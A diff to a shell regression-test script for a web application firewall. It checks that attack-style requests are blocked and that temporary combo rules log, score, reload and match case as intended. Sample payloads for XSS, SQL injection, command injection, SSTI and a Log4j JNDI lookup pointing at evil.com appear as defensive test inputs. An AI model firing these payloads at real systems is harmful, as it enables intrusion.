@@ -258,9 +258,106 @@ test_rule "bodyless恢复on: GET放行" 200 -H "User-Agent: Mozilla/5.0" -X GET 
 echo -e "\n${CYAN}=== 8. POST JSON body 攻击 ===${NC}" | tee -a $RESULTS
 test_rule "JSON XSS script" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"q":"<script>alert(1)</script>"}' "$TARGET/"
 test_rule "JSON SQL union" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"id":"1 union select 1"}' "$TARGET/"
-test_rule "JSON system()" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"cmd":"system(ls)"}' "$TARGET/"
+test_rule "JSON system()" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"cmd":"system(\"ls\")"}' "$TARGET/"
 test_rule "JSON Log4j" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"q":"${jndi:ldap://evil.com}"}' "$TARGET/"
 test_rule "JSON SSTI" 403 -H "User-Agent: Mozilla/5.0" -H "Content-Type: application/json" -d '{"x":"{{__class__}}"}' "$TARGET/"
+
+# ============================================================
+# 8.1 三层组合规则 (combo.jsonl): CVE 虚拟补丁 / 动作 / 热加载
+# ============================================================
+echo -e "\n${CYAN}=== 8.1 三层组合规则 ===${NC}" | tee -a $RESULTS
+test_rule "Combo: WP setup-config" 403 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/wp-admin/setup-config.php"
+test_rule "Combo: WP upgrade php" 403 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/wp-content/upgrade/evil.php"
+test_rule "Combo: WP upgrade 非php放行" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/wp-content/upgrade/evil.txt"
+test_rule "Combo: Axis SOAP Fault" 403 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" -H "Content-Type: text/xml" --data '<?xml version="1.0"?><soap:Fault><soap:exceptionName>x</soap:exceptionName></soap:Fault>' "$TARGET/"
+test_rule "Combo: phpAfterShell upload_progress" 403 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" -F "PHP_SESSION_UPLOAD_PROGRESS=abc" "$TARGET/"
+
+COMBO_FILE="/opt/nginx/lua/waf/rule-config/combo.jsonl"
+COMBO_BAK="/tmp/combo.regression.$$"
+$SSH180 "cp $COMBO_FILE $COMBO_BAK; cat >> $COMBO_FILE <<'EOF'
+{\"id\":\"tmp-log\",\"if\":{\"cond\":\"uri\",\"op\":\"prefix\",\"value\":\"/logtest\"},\"action\":\"LOG\"}
+{\"id\":\"tmp-score-a\",\"if\":{\"cond\":\"uri\",\"op\":\"prefix\",\"value\":\"/scoretest\"},\"action\":\"SCORE\",\"score\":10}
+{\"id\":\"tmp-score-b\",\"if\":{\"cond\":\"uri\",\"op\":\"prefix\",\"value\":\"/scoretest\"},\"action\":\"SCORE\",\"score\":10}
+{\"id\":\"tmp-badregex\",\"if\":[\"AND\",{\"cond\":\"uri\",\"op\":\"prefix\",\"value\":\"/badregex\"},{\"cond\":\"uri\",\"op\":\"re\",\"value\":\"[\"}],\"action\":\"BLOCK\"}
+{\"id\":\"tmp-ci-re\",\"if\":[\"AND\",{\"cond\":\"uri\",\"op\":\"prefix\",\"value\":\"/CITEST\"},{\"cond\":\"args\",\"op\":\"re\",\"value\":\"secret=\"}],\"action\":\"LOG\"}
+{\"id\":\"tmp-ci-contains\",\"if\":[\"AND\",{\"cond\":\"uri\",\"op\":\"prefix\",\"value\":\"/citest\"},{\"cond\":\"args\",\"op\":\"contains\",\"value\":\"evil\"}],\"action\":\"LOG\"}
+{\"id\":\"tmp-ci-prefix\",\"if\":{\"cond\":\"uri\",\"op\":\"prefix\",\"value\":\"/CIPREFIX\"},\"action\":\"LOG\"}
+{\"id\":\"tmp-ci-eq\",\"if\":[\"AND\",{\"cond\":\"uri\",\"op\":\"prefix\",\"value\":\"/citest\"},{\"cond\":\"args\",\"op\":\"eq\",\"value\":\"A=1\"}],\"action\":\"LOG\"}
+{\"id\":\"tmp-cs-re\",\"if\":[\"AND\",{\"cond\":\"uri\",\"op\":\"prefix\",\"value\":\"/citest\"},{\"cond\":\"args\",\"op\":\"re\",\"value\":\"secret=\",\"flags\":\"jo\"}],\"action\":\"LOG\"}
+{\"id\":\"tmp-cs-contains\",\"if\":[\"AND\",{\"cond\":\"uri\",\"op\":\"prefix\",\"value\":\"/citest\"},{\"cond\":\"args\",\"op\":\"contains\",\"value\":\"evil\",\"icase\":false}],\"action\":\"LOG\"}
+{\"id\":\"tmp-cs-prefix\",\"if\":{\"cond\":\"uri\",\"op\":\"prefix\",\"value\":\"/CSPREFIX\",\"icase\":false},\"action\":\"LOG\"}
+EOF"
+sleep $RULE_CACHE_WAIT
+test_rule "Combo: LOG 不拦截" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/logtest"
+test_rule "Combo: SCORE 未达阈值不拦截" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/scoretest"
+test_rule "Combo: 坏正则加载期丢弃" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/badregex"
+
+LOGFILE="$WAF_LOG_DIR/$(date +%Y-%m-%d)_waf.log"
+log_count() { $SSH180 "grep -c '\"rule_tag\":\"$1\"' $LOGFILE" 2>/dev/null || true; }
+
+# 内联条件默认忽略大小写
+CI_BEFORE=$(log_count tmp-ci-re)
+test_rule "Combo: re 默认忽略大小写" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/CITEST?SECRET=1"
+CI_AFTER=$(log_count tmp-ci-re)
+if [ "$CI_AFTER" -gt "$CI_BEFORE" ]; then ok "Combo: re 默认忽略大小写(命中)" "$CI_AFTER"; else bad "Combo: re 默认忽略大小写未命中" "$CI_AFTER" ">$CI_BEFORE"; fi
+
+CI_BEFORE=$(log_count tmp-ci-contains)
+test_rule "Combo: contains 默认忽略大小写" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/citest?x=EVIL"
+CI_AFTER=$(log_count tmp-ci-contains)
+if [ "$CI_AFTER" -gt "$CI_BEFORE" ]; then ok "Combo: contains 默认忽略大小写(命中)" "$CI_AFTER"; else bad "Combo: contains 默认忽略大小写未命中" "$CI_AFTER" ">$CI_BEFORE"; fi
+
+CI_BEFORE=$(log_count tmp-ci-prefix)
+test_rule "Combo: prefix 默认忽略大小写" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/ciprefix"
+CI_AFTER=$(log_count tmp-ci-prefix)
+if [ "$CI_AFTER" -gt "$CI_BEFORE" ]; then ok "Combo: prefix 默认忽略大小写(命中)" "$CI_AFTER"; else bad "Combo: prefix 默认忽略大小写未命中" "$CI_AFTER" ">$CI_BEFORE"; fi
+
+CI_BEFORE=$(log_count tmp-ci-eq)
+test_rule "Combo: eq(args) 默认忽略大小写" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/citest?a=1"
+CI_AFTER=$(log_count tmp-ci-eq)
+if [ "$CI_AFTER" -gt "$CI_BEFORE" ]; then ok "Combo: eq(args) 默认忽略大小写(命中)" "$CI_AFTER"; else bad "Combo: eq(args) 默认忽略大小写未命中" "$CI_AFTER" ">$CI_BEFORE"; fi
+
+# 显式关闭大小写忽略
+CS_BEFORE=$(log_count tmp-cs-re)
+test_rule "Combo: re flags=jo 区分大小写" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/citest?SECRET=1"
+CS_AFTER=$(log_count tmp-cs-re)
+if [ "$CS_AFTER" = "$CS_BEFORE" ]; then ok "Combo: re flags=jo 区分大小写(未命中)" "$CS_AFTER"; else bad "Combo: re flags=jo 仍忽略大小写" "$CS_AFTER" "$CS_BEFORE"; fi
+
+CS_BEFORE=$(log_count tmp-cs-contains)
+test_rule "Combo: contains icase=false 区分大小写" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/citest?x=EVIL"
+CS_AFTER=$(log_count tmp-cs-contains)
+if [ "$CS_AFTER" = "$CS_BEFORE" ]; then ok "Combo: contains icase=false 区分大小写(未命中)" "$CS_AFTER"; else bad "Combo: contains icase=false 仍忽略大小写" "$CS_AFTER" "$CS_BEFORE"; fi
+
+CS_BEFORE=$(log_count tmp-cs-prefix)
+test_rule "Combo: prefix icase=false 区分大小写" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/csprefix"
+CS_AFTER=$(log_count tmp-cs-prefix)
+if [ "$CS_AFTER" = "$CS_BEFORE" ]; then ok "Combo: prefix icase=false 区分大小写(未命中)" "$CS_AFTER"; else bad "Combo: prefix icase=false 仍忽略大小写" "$CS_AFTER" "$CS_BEFORE"; fi
+
+if $SSH180 "grep -q '\"rule_tag\":\"tmp-log\"' $LOGFILE" 2>/dev/null; then
+    ok "Combo: LOG 日志已记录" "found"
+else
+    bad "Combo: LOG 日志缺失" "not found" "found"
+fi
+if $SSH180 "grep -q '\"rule_tag\":\"tmp-score-b\"' $LOGFILE" 2>/dev/null; then
+    ok "Combo: SCORE 日志已记录" "found"
+else
+    bad "Combo: SCORE 日志缺失" "not found" "found"
+fi
+if $SSH180 "grep -q 'combo: invalid regex' /opt/nginx/log/error.log" 2>/dev/null; then
+    ok "Combo: 坏正则错误日志已记录" "found"
+else
+    bad "Combo: 坏正则错误日志缺失" "not found" "found"
+fi
+
+$SSH180 "cp $COMBO_BAK $COMBO_FILE; rm -f $COMBO_BAK"
+sleep $RULE_CACHE_WAIT
+LOG_BEFORE=$($SSH180 "grep -c '\"rule_tag\":\"tmp-log\"' $LOGFILE" 2>/dev/null || true)
+test_rule "Combo: 恢复规则文件" 404 -H "Host: unknown.com" -H "User-Agent: Mozilla/5.0" "$TARGET/logtest"
+LOG_AFTER=$($SSH180 "grep -c '\"rule_tag\":\"tmp-log\"' $LOGFILE" 2>/dev/null || true)
+if [ "$LOG_BEFORE" = "$LOG_AFTER" ]; then
+    ok "Combo: 临时规则已热加载移除" "same"
+else
+    bad "Combo: 临时规则仍生效" "$LOG_AFTER" "$LOG_BEFORE"
+fi
 
 # ============================================================
 # 9. 正常请求不误报 (回归)
